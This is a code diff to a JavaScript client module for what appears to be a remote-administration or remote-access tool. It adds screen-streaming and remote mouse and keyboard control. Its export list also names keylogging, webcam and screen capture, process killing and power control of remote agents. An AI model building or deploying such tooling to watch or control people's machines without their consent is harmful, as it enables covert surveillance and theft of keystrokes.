@@ -699,49 +699,104 @@ export function checkProcessListUpdate() {
     return window.gateway.getFormattedProcessList() || [];
 }
 
+export function startStream() {
+    if (!window.gateway) {
+        console.error('[Logic] Gateway not ready');
+        return false;
+    }
+
+    if (window.gateway.targetId === 'ALL' || !window.gateway.targetId) {
+        console.error('[Logic] No Agent to stream.');
+        return false;
+    }
+
+    console.log('[Logic] Sending START_STREAM command to agent:', window.gateway.targetId);
+    window.gateway.send("start_stream", "");
+    return true;
+}
+
+export function stopStream() {
+    if (!window.gateway) return false;
+    console.log('[Logic] Sending STOP_STREAM command');
+    window.gateway.send("stop_stream", "");
+    return true;
+}
+
+/**
+ * @param {number} x 
+ * @param {number} y 
+ */
+export function mouseMove(x, y) {
+    if (!window.gateway || !window.gateway.isAuthenticated) return;
+    
+    window.gateway.send("mouse_move", { x, y });
+}
+
+/**
+ * @param {string} button
+ * @param {boolean} down
+ */
+export function mouseClick(button, down) {
+    if (!window.gateway || !window.gateway.isAuthenticated) return;
+
+    window.gateway.send("mouse_click", {
+        button: button,
+        down: down
+    });
+}
+
+/**
+ * @param {number} keycode
+ * @param {boolean} down
+ */
+export function keyEvent(keycode, down) {
+    if (!window.gateway || !window.gateway.isAuthenticated) return;
+
+    window.gateway.send("key_event", {
+        keycode: keycode,
+        down: down
+    });
+}
+
 export default {
-    // Agent Management
     getAgentList,
     authenticate,
     setTarget,
     initAgentTargetFromURL,
     
-    // Application Management
     fetchAppList,
     startApp,
     stopApp,
     
-    // Process Management
     fetchProcessList,
     startProcess,
     killProcess,
     
-    // Screen & Webcam
     captureScreen,
     captureWebcam,
     recordScreen,
     recordWebcam,
     
-    // Keylogger
     startKeylog,
     stopKeylog,
-    
-    // Power Control
+
     shutdownAgent,
     restartAgent,
     sleepAgent,
-    
-    // File System
+
     listFiles,
     
-    // Utility
     whoami,
     echo,
     
-    // Data Processing
     processKeylogData,
     getFormattedAppList,
     getFormattedProcessList,
     checkAppListUpdate,
-    checkProcessListUpdate
+    checkProcessListUpdate,
+
+    startStream,
+    stopStream,
+    mouseMove,
+    keyEvent
 };
